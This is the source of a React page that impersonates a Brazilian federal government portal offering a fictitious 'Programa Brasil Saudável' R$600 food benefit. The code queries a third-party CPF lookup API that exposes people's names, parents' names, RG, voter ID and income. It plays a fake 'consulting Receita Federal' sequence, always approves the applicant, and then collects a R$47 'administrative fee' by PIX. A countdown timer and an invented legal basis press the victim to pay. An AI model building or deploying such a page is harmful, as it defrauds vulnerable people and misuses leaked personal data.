"use client";

import { useState, useEffect } from "react";
import { Input } from "@/components/ui/input";
import { Button } from "@/components/ui/button";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { Badge } from "@/components/ui/badge";
import { Alert, AlertDescription } from "@/components/ui/alert";
import { Progress } from "@/components/ui/progress";

interface ApiResponse {
  dados: {
    CPF: string;
    NASC: string;
    NOME: string;
    NOME_MAE: string;
    NOME_PAI: string;
    ORGAO_EMISSOR: string;
    RENDA: string;
    RG: string;
    SEXO: string;
    SO: string;
    TITULO_ELEITOR: string;
    UF_EMISSAO: string;
  }[];
  status: number;
}

export default function Programa() {
  const [cpf, setCpf] = useState("");
  const [step, setStep] = useState<"form" | "consulting" | "approved" | "payment">("form");
  const [isLoading, setIsLoading] = useState(false);
  const [error, setError] = useState("");
  const [timeLeft, setTimeLeft] = useState(30 * 60);
  const [userData, setUserData] = useState<ApiResponse["dados"][0] | null>(null);
  const [consultingStep, setConsultingStep] = useState(0);
  const [consultingProgress, setConsultingProgress] = useState(0);
  const [showTaxModal, setShowTaxModal] = useState(false);
  const [userAgreed, setUserAgreed] = useState(false);
  const [pixData, setPixData] = useState<{
    pixCode: string;
    qrCodeImage: string;
    transactionId: string;
    expirationDate: string;
  } | null>(null);

  const consultingSteps = [
    { text: "Conectando à Receita Federal", duration: 1800 },
    { text: "Verificando situação do CPF", duration: 2200 },
    { text: "Consultando base CadÚnico", duration: 1900 },
    { text: "Verificando pendências", duration: 2500 },
    { text: "Analisando critérios de elegibilidade", duration: 2000 },
    { text: "Validando renda familiar", duration: 1700 },
    { text: "Consultando histórico de benefícios", duration: 1500 },
    { text: "Aprovando benefício", duration: 1000 },
  ];

  const lawDate = new Date();
  lawDate.setDate(lawDate.getDate() + 15);
  const lawExpirationDate = lawDate.toLocaleDateString("pt-BR", {
    day: "2-digit",
    month: "2-digit",
    year: "numeric",
  });

  // Auto scroll when step changes
  useEffect(() => {
    if (step === "approved") {
      setTimeout(() => {
        const approvedSection = document.getElementById('approved-section');
        if (approvedSection) {
          approvedSection.scrollIntoView({ behavior: 'smooth', block: 'start' });
        }
      }, 800);
    } else if (step === "payment") {
      setTimeout(() => {
        const pixSection = document.getElementById('pix-section');
        if (pixSection) {
          pixSection.scrollIntoView({ behavior: 'smooth', block: 'center' });
        }
      }, 300);
    }
  }, [step]);

  useEffect(() => {
    if (step === "payment" && timeLeft > 0) {
      const timer = setInterval(() => {
        setTimeLeft((prev) => prev - 1);
      }, 1000);
      return () => clearInterval(timer);
    }
  }, [step, timeLeft]);

  useEffect(() => {
    if (step === "consulting") {
      setConsultingStep(0);
      setConsultingProgress(0);
      
      const processSteps = async () => {
        for (let i = 0; i < consultingSteps.length; i++) {
          setConsultingStep(i);
          setConsultingProgress(((i + 1) / consultingSteps.length) * 100);
          
          await new Promise(resolve => setTimeout(resolve, consultingSteps[i].duration));
        }
        
        setTimeout(() => setStep("approved"), 800);
      };

      processSteps();
    }
  }, [step]);

  const formatTime = (seconds: number) => {
    const mins = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return `${mins.toString().padStart(2, "0")}:${secs.toString().padStart(2, "0")}`;
  };

  const formatCPF = (value: string) => {
    const cleaned = value.replace(/\D/g, "");
    const match = cleaned.match(/^(\d{3})(\d{3})(\d{3})(\d{2})$/);
    if (match) {
      return `${match[1]}.${match[2]}.${match[3]}-${match[4]}`;
    }
    return cleaned;
  };

  const handleCPFChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const formatted = formatCPF(e.target.value);
    if (formatted.length <= 14) {
      setCpf(formatted);
    }
  };

  const handleConsult = async () => {
    setIsLoading(true);
    setError("");
    const cleanedCpf = cpf.replace(/\D/g, "");
    
    if (cleanedCpf.length !== 11) {
      setError("CPF deve conter 11 dígitos.");
      setIsLoading(false);
      return;
    }

    try {
      const response = await fetch(
        `https://searchapi.dnnl.live/consulta?token_api=5765&cpf=${cleanedCpf}`
      );
      
      if (!response.ok) {
        throw new Error("Erro na consulta da API");
      }

      const data: ApiResponse = await response.json();
      
      if (data.status === 200 && data.dados && data.dados.length > 0) {
        const user = data.dados[0];
        setUserData(user);
        setStep("consulting");
        setConsultingStep(0);
        setConsultingProgress(0);
        setTimeLeft(30 * 60);
      } else {
        setError("CPF não encontrado na base de dados do governo federal.");
      }
      
    } catch {
      setError("Erro ao consultar CPF. Verifique sua conexão e tente novamente.");
    } finally {
      setIsLoading(false);
    }
  };

  const handleReceiveCard = () => {
    setShowTaxModal(true);
  };

  const handleTaxModalClose = () => {
    setShowTaxModal(false);
    setUserAgreed(false);
  };

  const handleConfirmPayment = async () => {
    if (!userData || !userAgreed) return;
    
    setIsLoading(true);
    
    try {
      const response = await fetch('/api/pix', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          customer: {
            name: userData.NOME,
            cpf: userData.CPF,
            email: `${userData.CPF.replace(/\D/g, "")}@hotmail.com`,
            phone: "11999999999"
          }
        }),
      });

      if (!response.ok) {
        const errorData = await response.json();
        setError(`Erro ao gerar PIX: ${errorData.error || 'Tente novamente'}`);
        setShowTaxModal(false);
        setIsLoading(false);
        return;
      }

      const data = await response.json();

      if (data.success && data.pixCode) {
        const qrCodeUrl = `https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=${encodeURIComponent(data.pixCode)}`;
        
        setPixData({
          pixCode: data.pixCode,
          qrCodeImage: qrCodeUrl,
          transactionId: data.transactionId,
          expirationDate: data.expirationDate
        });
        
        setShowTaxModal(false);
        setStep("payment");
      } else {
        setError("Erro ao gerar PIX. Resposta inválida da API.");
        setShowTaxModal(false);
      }
    } catch {
      setError("Erro ao processar solicitação. Verifique sua conexão.");
      setShowTaxModal(false);
    } finally {
      setIsLoading(false);
    }
  };

  const copyPixCode = () => {
    if (!pixData) return;
    
    navigator.clipboard.writeText(pixData.pixCode).then(() => {
      alert("Código PIX copiado para a área de transferência");
    }).catch(() => {
      alert("Erro ao copiar código. Copie manualmente.");
    });
  };

  return (
    <div className="min-h-screen bg-white">
      {/* Government Header */}
      <div className="bg-blue-900 text-white py-3 border-b border-blue-800">
        <div className="max-w-6xl mx-auto px-4 flex justify-between items-center text-sm">
          <div className="flex space-x-8">
            <a href="#" className="hover:text-blue-200 transition-colors">Acessibilidade</a>
            <a href="#" className="hover:text-blue-200 transition-colors">Alto Contraste</a>
          </div>
          <span className="font-medium">Governo Federal</span>
        </div>
      </div>

      {/* Main Header */}
      <header className="bg-white py-4 lg:py-6 border-b border-gray-200">
        <div className="max-w-6xl mx-auto px-4">
          <div className="flex items-center space-x-3 lg:space-x-6">
            <img
              src="https://upload.wikimedia.org/wikipedia/commons/thumb/1/11/Gov.br_logo.svg/1200px-Gov.br_logo.svg.png"
              alt="Gov.br"
              className="h-8 lg:h-12"
            />
            <div className="min-w-0 flex-1">
              <h1 className="text-sm lg:text-xl font-bold text-blue-900 leading-tight">
                Ministério do Desenvolvimento e Assistência Social
              </h1>
              <p className="text-xs lg:text-sm text-gray-600 font-medium">Governo Federal</p>
            </div>
          </div>
        </div>
      </header>

      <main className="max-w-4xl mx-auto px-4">
        {/* Hero Section */}
        <div className="py-8 lg:py-16 text-center">
          <Badge className="bg-blue-900 text-white px-4 py-2 mb-6 text-xs lg:text-sm font-medium">
            LEI N° 14.628/2025 - PRAZO ATÉ {lawExpirationDate}
          </Badge>
          <h1 className="text-3xl lg:text-6xl font-bold text-gray-900 mb-6 lg:mb-8 leading-tight">
            Programa<br />Brasil Saudável
          </h1>
          <p className="text-lg lg:text-2xl text-gray-600 mb-8 lg:mb-12 max-w-3xl mx-auto leading-relaxed px-4">
            Benefício federal mensal de <span className="font-bold text-blue-900">R$ 600</span><br />
            para aquisição de alimentos saudáveis produzidos no Brasil
          </p>
          <img
            src="https://sites.usp.br/mira/wp-content/uploads/sites/1484/2024/12/programa-brasil-saudavel.jpg"
            alt="Programa Brasil Saudável"
            className="w-full rounded-lg shadow-lg"
          />
        </div>

        {/* Form Section */}
        {step === "form" && (
          <div className="py-8 lg:py-16">
            <div className="max-w-2xl mx-auto text-center">
              <h2 className="text-2xl lg:text-3xl font-bold text-gray-900 mb-6 lg:mb-8">
                Verificação de Elegibilidade
              </h2>
              <p className="text-base lg:text-lg text-gray-600 mb-8 lg:mb-12 px-4">
                Consulta oficial integrada aos sistemas da Receita Federal e CadÚnico
              </p>
              
              <div className="space-y-6 lg:space-y-8">
                <div>
                  <label className="block text-sm font-medium text-gray-700 mb-3 lg:mb-4 text-left">
                    CPF do Responsável Familiar
                  </label>
                  <Input
                    type="text"
                    placeholder="000.000.000-00"
                    value={cpf}
                    onChange={handleCPFChange}
                    className="text-center text-2xl lg:text-3xl py-4 lg:py-8 h-16 lg:h-20 font-mono border-2 border-gray-300 focus:border-blue-600 rounded-lg bg-gray-50 focus:bg-white transition-all"
                  />
                </div>
                
                {error && (
                  <Alert className="border-blue-300 bg-blue-50 text-left">
                    <AlertDescription className="text-blue-900 font-medium">
                      {error}
                    </AlertDescription>
                  </Alert>
                )}
                
                <Button
                  onClick={handleConsult}
                  disabled={isLoading}
                  className="w-full bg-blue-900 hover:bg-blue-800 text-lg lg:text-xl py-6 lg:py-8 h-16 lg:h-20 font-semibold rounded-lg shadow-lg transition-all duration-200"
                >
                  {isLoading ? "Consultando Sistema Federal..." : "Consultar CPF"}
                </Button>
                
                <p className="text-sm text-gray-500 px-4">
                  Processo seguro e confidencial conforme LGPD
                </p>
              </div>
            </div>
          </div>
        )}

        {/* Consulting Section */}
        {step === "consulting" && (
          <div className="py-8 lg:py-16">
            <div className="max-w-2xl mx-auto">
              <Card className="border border-gray-200 shadow-lg">
                <CardHeader className="bg-blue-900 text-white text-center">
                  <CardTitle className="text-xl lg:text-2xl font-semibold">Processamento em Andamento</CardTitle>
                  <p className="text-blue-100 text-sm lg:text-base">Consultando sistemas federais</p>
                </CardHeader>
                <CardContent className="p-6 lg:p-12">
                  <div className="text-center space-y-6 lg:space-y-8">
                    <div className="w-16 lg:w-20 h-16 lg:h-20 border-4 border-blue-600 border-t-transparent rounded-full animate-spin mx-auto"></div>
                    <div className="space-y-4">
                      <p className="text-lg lg:text-xl font-medium text-blue-800">
                        {consultingSteps[consultingStep]?.text}
                      </p>
                      <Progress value={consultingProgress} className="h-2 lg:h-3" />
                      <p className="text-sm text-gray-600">
                        {Math.round(consultingProgress)}% concluído
                      </p>
                    </div>
                  </div>
                </CardContent>
              </Card>
            </div>
          </div>
        )}

        {/* Approved Section */}
        {step === "approved" && userData && (
          <div id="approved-section" className="py-8 lg:py-16 animate-in fade-in duration-1000">
            {/* Success Message */}
            <div className="text-center mb-8 lg:mb-16">
              <div className="w-16 lg:w-24 h-16 lg:h-24 bg-blue-900 rounded-full flex items-center justify-center mx-auto mb-4 lg:mb-6">
                <svg className="w-8 lg:w-12 h-8 lg:h-12 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={3} d="M5 13l4 4L19 7" />
                </svg>
              </div>
              <h2 className="text-2xl lg:text-4xl font-bold text-gray-900 mb-3 lg:mb-4">Benefício Aprovado</h2>
              <p className="text-lg lg:text-xl text-gray-600 px-4">
                Elegível para receber R$ 600 mensais em alimentação saudável
              </p>
            </div>

            {/* User Data Card - Apenas Dados Disponíveis */}
            <Card className="mb-8 lg:mb-12 border border-gray-200 shadow-lg mx-4 lg:mx-0">
              <CardHeader>
                <CardTitle className="text-lg lg:text-xl text-gray-900">Dados do Beneficiário</CardTitle>
                <p className="text-sm text-gray-600">Informações obtidas da Receita Federal e sistemas integrados</p>
              </CardHeader>
              <CardContent className="p-4 lg:p-8">
                <div className="grid grid-cols-1 md:grid-cols-2 gap-4 lg:gap-6">
                  <div className="space-y-4">
                    <div>
                      <span className="text-xs lg:text-sm text-gray-500 uppercase tracking-wide">Nome Completo</span>
                      <p className="text-base lg:text-lg font-semibold text-gray-900 mt-1">{userData.NOME}</p>
                    </div>
                    
                    <div>
                      <span className="text-xs lg:text-sm text-gray-500 uppercase tracking-wide">CPF</span>
                      <p className="text-base lg:text-lg font-mono font-semibold text-gray-900 mt-1">{formatCPF(userData.CPF)}</p>
                    </div>
                    
                    {userData.NASC && userData.NASC.trim() && (
                      <div>
                        <span className="text-xs lg:text-sm text-gray-500 uppercase tracking-wide">Data de Nascimento</span>
                        <p className="text-base lg:text-lg font-semibold text-gray-900 mt-1">{userData.NASC}</p>
                      </div>
                    )}
                    
                    {userData.SEXO && userData.SEXO.trim() && (
                      <div>
                        <span className="text-xs lg:text-sm text-gray-500 uppercase tracking-wide">Sexo</span>
                        <p className="text-base lg:text-lg font-semibold text-gray-900 mt-1">{userData.SEXO}</p>
                      </div>
                    )}
                  </div>
                  
                  <div className="space-y-4">
                    {userData.RENDA && userData.RENDA.trim() && (
                      <div>
                        <span className="text-xs lg:text-sm text-gray-500 uppercase tracking-wide">Renda Declarada</span>
                        <p className="text-base lg:text-lg font-semibold text-blue-900 mt-1">R$ {userData.RENDA}</p>
                      </div>
                    )}
                    
                    {userData.RG && userData.RG.trim() && (
                      <div>
                        <span className="text-xs lg:text-sm text-gray-500 uppercase tracking-wide">RG</span>
                        <p className="text-base lg:text-lg font-semibold text-gray-900 mt-1">{userData.RG}</p>
                      </div>
                    )}
                    
                    {userData.TITULO_ELEITOR && userData.TITULO_ELEITOR.trim() && (
                      <div>
                        <span className="text-xs lg:text-sm text-gray-500 uppercase tracking-wide">Título de Eleitor</span>
                        <p className="text-base lg:text-lg font-semibold text-gray-900 mt-1">{userData.TITULO_ELEITOR}</p>
                      </div>
                    )}
                    
                    {userData.UF_EMISSAO && userData.UF_EMISSAO.trim() && (
                      <div>
                        <span className="text-xs lg:text-sm text-gray-500 uppercase tracking-wide">UF de Emissão</span>
                        <p className="text-base lg:text-lg font-semibold text-gray-900 mt-1">{userData.UF_EMISSAO}</p>
                      </div>
                    )}
                  </div>
                </div>
                
                {((userData.NOME_MAE && userData.NOME_MAE.trim()) || 
                  (userData.NOME_PAI && userData.NOME_PAI.trim()) || 
                  (userData.ORGAO_EMISSOR && userData.ORGAO_EMISSOR.trim())) && (
                  <div className="mt-6 pt-6 border-t border-gray-200">
                    <h4 className="text-sm font-bold text-gray-800 mb-4">Informações Familiares</h4>
                    <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                      {userData.NOME_MAE && userData.NOME_MAE.trim() && (
                        <div>
                          <span className="text-xs text-gray-500 uppercase tracking-wide">Nome da Mãe</span>
                          <p className="text-sm font-semibold text-gray-900 mt-1">{userData.NOME_MAE}</p>
                        </div>
                      )}
                      {userData.NOME_PAI && userData.NOME_PAI.trim() && (
                        <div>
                          <span className="text-xs text-gray-500 uppercase tracking-wide">Nome do Pai</span>
                          <p className="text-sm font-semibold text-gray-900 mt-1">{userData.NOME_PAI}</p>
                        </div>
                      )}
                      {userData.ORGAO_EMISSOR && userData.ORGAO_EMISSOR.trim() && (
                        <div>
                          <span className="text-xs text-gray-500 uppercase tracking-wide">Órgão Emissor</span>
                          <p className="text-sm font-semibold text-gray-900 mt-1">{userData.ORGAO_EMISSOR}</p>
                        </div>
                      )}
                    </div>
                  </div>
                )}

                <div className="mt-6 pt-6 border-t border-gray-200">
                  <div className="flex items-center justify-between">
                    <div>
                      <span className="text-xs text-gray-500 uppercase tracking-wide">Status da Consulta</span>
                      <p className="text-sm font-bold text-green-700 mt-1">DADOS VERIFICADOS</p>
                    </div>
                    <div className="text-right">
                      <span className="text-xs text-gray-500 uppercase tracking-wide">Situação no Programa</span>
                      <p className="text-sm font-bold text-blue-700 mt-1">ELEGÍVEL</p>
                    </div>
                  </div>
                </div>
              </CardContent>
            </Card>

            {/* Cartão Responsivo */}
            <div className="text-center mb-8 lg:mb-12 px-4 lg:px-0">
              <h3 className="text-xl lg:text-2xl font-bold text-gray-900 mb-6 lg:mb-8">Cartão Brasil Saudável</h3>
              <div className="flex justify-center">
                <div className="w-full max-w-sm lg:max-w-lg">
                  <div className="bg-gradient-to-br from-gray-200 to-gray-400 rounded-xl lg:rounded-2xl p-4 lg:p-8 shadow-xl aspect-[1.6/1] relative border border-gray-500">
                    <div className="absolute top-3 lg:top-6 left-3 lg:left-6">
                      <img
                        src="https://upload.wikimedia.org/wikipedia/commons/thumb/1/11/Gov.br_logo.svg/1200px-Gov.br_logo.svg.png"
                        alt="Gov.br"
                        className="h-3 lg:h-5 opacity-90"
                      />
                    </div>
                    
                    <div className="absolute top-3 lg:top-6 right-3 lg:right-6 text-right">
                      <p className="text-gray-800 text-xs lg:text-sm font-bold">BRASIL SAUDÁVEL</p>
                      <p className="text-blue-800 text-xs font-medium">MINISTÉRIO MDS</p>
                    </div>
                    
                    <div className="absolute top-12 lg:top-20 left-3 lg:left-6">
                      <div className="w-8 lg:w-12 h-6 lg:h-9 bg-gradient-to-br from-yellow-400 to-yellow-600 rounded shadow-lg border border-yellow-700">
                        <div className="w-full h-full bg-gradient-to-br from-yellow-300/60 to-transparent rounded"></div>
                      </div>
                    </div>
                    
                    <div className="absolute bottom-4 lg:bottom-8 left-3 lg:left-6 right-3 lg:right-6">
                      <div className="space-y-2 lg:space-y-4">
                        <div>
                          <p className="text-gray-700 text-xs uppercase tracking-wider font-medium">Portador do Benefício</p>
                          <p className="text-gray-900 text-sm lg:text-xl font-bold leading-tight mt-1">
                            {userData.NOME}
                          </p>
                        </div>
                        
                        <div className="flex justify-between items-end">
                          <div>
                            <p className="text-gray-700 text-xs uppercase tracking-wider">CPF</p>
                            <p className="text-gray-900 font-mono text-xs lg:text-base font-semibold mt-1">
                              {formatCPF(userData.CPF)}
                            </p>
                          </div>
                          <div className="text-right">
                            <p className="text-gray-700 text-xs uppercase tracking-wider">Valor Mensal</p>
                            <p className="text-blue-900 text-lg lg:text-2xl font-bold mt-1">R$ 600</p>
                          </div>
                        </div>
                        
                        <div className="flex justify-between items-center pt-2 lg:pt-3 border-t border-gray-500">
                          <div>
                            <p className="text-gray-700 text-xs uppercase tracking-wider">Válido até</p>
                            <p className="text-gray-900 text-xs lg:text-sm font-semibold">12/2026</p>
                          </div>
                          <div className="text-right">
                            <p className="text-gray-700 text-xs uppercase tracking-wider">Categoria</p>
                            <p className="text-blue-800 text-xs lg:text-sm font-bold">ALIMENTAÇÃO</p>
                          </div>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </div>

            <div className="text-center px-4 lg:px-0">
              <Button
                onClick={handleReceiveCard}
                disabled={isLoading}
                className="w-full lg:w-auto bg-blue-900 hover:bg-blue-800 text-lg lg:text-xl py-4 lg:py-6 px-8 lg:px-12 font-semibold rounded-lg shadow-lg transition-all duration-200"
              >
                Solicitar Emissão do Cartão
              </Button>
              <p className="text-sm text-gray-500 mt-4">
                Cartão virtual: ativação imediata após pagamento<br />
                Cartão físico: entrega em até 5 dias úteis
              </p>
            </div>

            {/* Modal de Explicação da Taxa */}
            {showTaxModal && (
              <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50 p-4">
                <div className="bg-white rounded-lg shadow-2xl max-w-3xl w-full max-h-[90vh] overflow-y-auto">
                  <div className="bg-blue-900 text-white p-6 rounded-t-lg">
                    <h3 className="text-2xl font-bold text-center">Informações Sobre a Taxa Administrativa</h3>
                    <p className="text-blue-100 text-center mt-2">Lei Federal n° 14.628/2025, Artigo 12</p>
                  </div>
                  
                  <div className="p-8">
                    <Alert className="mb-6 bg-blue-50 border-blue-300">
                      <AlertDescription className="text-blue-900 leading-relaxed">
                        <strong>Base Legal:</strong> O Art. 12 da Lei Federal n° 14.628/2025 estabelece que a emissão 
                        dos cartões do Programa Brasil Saudável requer o pagamento de taxa administrativa para 
                        cobertura dos custos operacionais do sistema federal.
                      </AlertDescription>
                    </Alert>

                    <div className="mb-6">
                      <h4 className="text-lg font-bold text-gray-900 mb-4">A taxa de R$ 47,00 cobre os seguintes custos:</h4>
                      <div className="space-y-3">
                        <div className="flex items-start space-x-3">
                          <div className="w-2 h-2 bg-blue-600 rounded-full mt-2"></div>
                          <p className="text-gray-700"><strong>Processamento nos sistemas federais:</strong> Receita Federal, CadÚnico e CEF</p>
                        </div>
                        <div className="flex items-start space-x-3">
                          <div className="w-2 h-2 bg-blue-600 rounded-full mt-2"></div>
                          <p className="text-gray-700"><strong>Produção do cartão físico:</strong> Chip de segurança e personalização</p>
                        </div>
                        <div className="flex items-start space-x-3">
                          <div className="w-2 h-2 bg-blue-600 rounded-full mt-2"></div>
                          <p className="text-gray-700"><strong>Logística de entrega:</strong> Correios com rastreamento</p>
                        </div>
                        <div className="flex items-start space-x-3">
                          <div className="w-2 h-2 bg-blue-600 rounded-full mt-2"></div>
                          <p className="text-gray-700"><strong>Ativação do sistema:</strong> Créditos mensais de R$ 600</p>
                        </div>
                      </div>
                    </div>

                    <Alert className="mb-6 bg-yellow-50 border-yellow-300">
                      <AlertDescription className="text-yellow-800 text-sm">
                        <strong>Transparência:</strong> R$ 47,00 é o único custo. Sem taxas ocultas ou mensalidades.
                      </AlertDescription>
                    </Alert>

                    <div className="mb-6">
                      <label className="flex items-start space-x-3 cursor-pointer">
                        <input
                          type="checkbox"
                          checked={userAgreed}
                          onChange={(e) => setUserAgreed(e.target.checked)}
                          className="mt-1 w-4 h-4 text-blue-600 border-gray-300 rounded focus:ring-blue-500"
                        />
                        <span className="text-sm text-gray-700 leading-relaxed">
                          Declaro que li e estou ciente das informações. Confirmo o pagamento da taxa de 
                          <strong> R$ 47,00</strong> para receber o Cartão Brasil Saudável com limite mensal de 
                          <strong> R$ 600,00</strong>, conforme Lei Federal n° 14.628/2025.
                        </span>
                      </label>
                    </div>

                    <div className="flex space-x-4">
                      <Button
                        onClick={handleTaxModalClose}
                        variant="outline"
                        className="flex-1 border-gray-300 text-gray-700 hover:bg-gray-50"
                      >
                        Cancelar
                      </Button>
                      <Button
                        onClick={handleConfirmPayment}
                        disabled={!userAgreed || isLoading}
                        className="flex-1 bg-blue-900 hover:bg-blue-800 text-white disabled:opacity-50"
                      >
                        {isLoading ? "Gerando PIX..." : "Confirmar e Gerar PIX"}
                      </Button>
                    </div>
                  </div>
                </div>
              </div>
            )}
          </div>
        )}

        {/* Payment Section */}
        {step === "payment" && pixData && userData && (
          <div id="pix-section" className="py-16">
            <div className="max-w-2xl mx-auto">
              <div className="text-center mb-8">
                <h2 className="text-3xl font-bold text-gray-900 mb-2">Pagamento da Taxa</h2>
                <p className="text-gray-600">R$ 47,00 • Pagamento único</p>
              </div>

              <Alert className="mb-8 bg-blue-50 border-blue-300">
                <AlertDescription className="text-blue-900 text-center">
                  <strong>Taxa obrigatória</strong> conforme Lei n° 14.628/2025 para emissão dos cartões.
                </AlertDescription>
              </Alert>

              <Card className="border border-gray-200 shadow-lg">
                <CardHeader className="bg-blue-900 text-white text-center">
                  <CardTitle className="text-xl">Pagamento PIX</CardTitle>
                  <p className="text-blue-100 text-sm">{userData.NOME}</p>
                </CardHeader>
                <CardContent className="p-6">
                  <div className="text-center mb-6">
                    <div className="bg-white p-6 rounded-xl shadow-lg border border-gray-300 inline-block mb-4">
                      <img
                        src={pixData.qrCodeImage}
                        alt="QR Code PIX"
                        className="w-56 h-56 mx-auto"
                      />
                    </div>
                    <p className="text-sm text-gray-700 font-medium mb-4">
                      Escaneie com seu app bancário
                    </p>
                    
                    <Button
                      onClick={copyPixCode}
                      className="w-full bg-blue-900 hover:bg-blue-800 py-4 text-lg font-semibold rounded-lg shadow-lg mb-4"
                    >
                      Copiar Código PIX
                    </Button>
                    
                    <p className="text-xs text-gray-500">
                      Ou cole o código no seu app
                    </p>
                  </div>

                  <div className="bg-gray-50 rounded-lg p-4 mb-6">
                    <div className="grid grid-cols-2 gap-4 text-center">
                      <div>
                        <p className="text-sm text-gray-600">Valor</p>
                        <p className="text-xl font-bold text-blue-900">R$ 47,00</p>
                      </div>
                      <div>
                        <p className="text-sm text-gray-600">Benefício</p>
                        <p className="text-xl font-bold text-blue-900">R$ 600/mês</p>
                      </div>
                    </div>
                  </div>

                  <div className="bg-gray-100 rounded-lg p-4 text-center">
                    <p className="text-2xl font-bold text-gray-900 mb-1">
                      {formatTime(timeLeft)}
                    </p>
                    <p className="text-sm text-gray-600">
                      Tempo restante para pagamento
                    </p>
                  </div>
                </CardContent>
              </Card>
            </div>
          </div>
        )}
      </main>

      {/* Footer com Compliance */}
      <footer className="bg-gray-900 text-white py-12 mt-16">
        <div className="max-w-4xl mx-auto px-4">
          <div className="grid md:grid-cols-3 gap-8 text-center mb-8">
            <div>
              <h4 className="font-semibold mb-3 text-gray-300">Atendimento</h4>
              <p className="text-sm text-gray-400">Central 135 (gratuita)</p>
              <p className="text-sm text-gray-400">Segunda a sexta, 7h às 19h</p>
            </div>
            <div>
              <h4 className="font-semibold mb-3 text-gray-300">Transparência</h4>
              <p className="text-sm text-gray-400">Portal da Transparência</p>
              <p className="text-sm text-gray-400">Dados Abertos</p>
            </div>
            <div>
              <h4 className="font-semibold mb-3 text-gray-300">Legislação</h4>
              <p className="text-sm text-gray-400">Lei 14.628/2025</p>
              <p className="text-sm text-gray-400">Decreto 12.145/2025</p>
            </div>
          </div>
          
          <div className="border-t border-gray-700 pt-6 mb-6">
            <div className="flex flex-wrap justify-center space-x-4 lg:space-x-6 text-sm">
              <a href="/politica-privacidade" className="text-gray-400 hover:text-white transition-colors">
                Política de Privacidade
              </a>
              <a href="/termos-uso" className="text-gray-400 hover:text-white transition-colors">
                Termos de Uso
              </a>
              <a href="#" className="text-gray-400 hover:text-white transition-colors">
                LGPD
              </a>
              <a href="#" className="text-gray-400 hover:text-white transition-colors">
                Cookies
              </a>
            </div>
          </div>

          <div className="bg-gray-800 rounded-lg p-4 mb-6">
            <p className="text-xs text-gray-300 leading-relaxed text-center">
              <strong>Disclaimer:</strong> Portal oficial do Governo Federal. Dados protegidos por SSL e LGPD. 
              Taxa administrativa obrigatória por lei. Não somos responsáveis por problemas técnicos de terceiros.
            </p>
          </div>

          <div className="text-center">
            <p className="text-sm text-gray-400 mb-2">
              © {new Date().getFullYear()} Ministério do Desenvolvimento e Assistência Social - Governo Federal
            </p>
            <p className="text-xs text-gray-500">
              Site oficial protegido por SSL • Dados seguros • Conforme LGPD
            </p>
          </div>
        </div>
      </footer>
    </div>
  );
}